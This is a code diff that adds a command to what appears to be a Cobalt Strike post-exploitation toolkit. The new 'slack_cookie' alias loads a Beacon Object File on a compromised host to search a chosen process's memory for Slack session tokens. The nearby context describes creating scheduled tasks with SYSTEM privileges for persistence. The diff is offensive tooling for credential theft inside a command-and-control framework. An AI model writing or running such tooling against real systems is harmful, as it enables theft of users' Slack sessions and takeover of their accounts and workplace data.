@@ -1916,4 +1916,25 @@ Note:    As of October 21, 2023, this tool has been tested on Windows 10, Window
          To create a scheduled task using this tool, NT AUTHORITY/SYSTEM privileges are required
          After configuring the scheduled task, you'll need to either restart the system or await the next reboot for the task to be loaded into the Schedule service process and subsequently executed
 "
+alias slack_cookie 
+{
+	local('$pid $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "usage: slack_cookie <pid>");
+		return;
+	}
+	$pid = parseNumber($2, 10);
+    berror($1, $pid);
+
+	$args = bof_pack($1, "i", $pid);
+	beacon_inline_execute($1, readbof($1, "slack_cookie"), "go", $args);
+}
+
+beacon_command_register(
+	"slack_cookie",
+	"Searches memory for Slack tokens",
+	"Command: slack_cookie
+
+Usage: slack_cookie <pid> "
 );
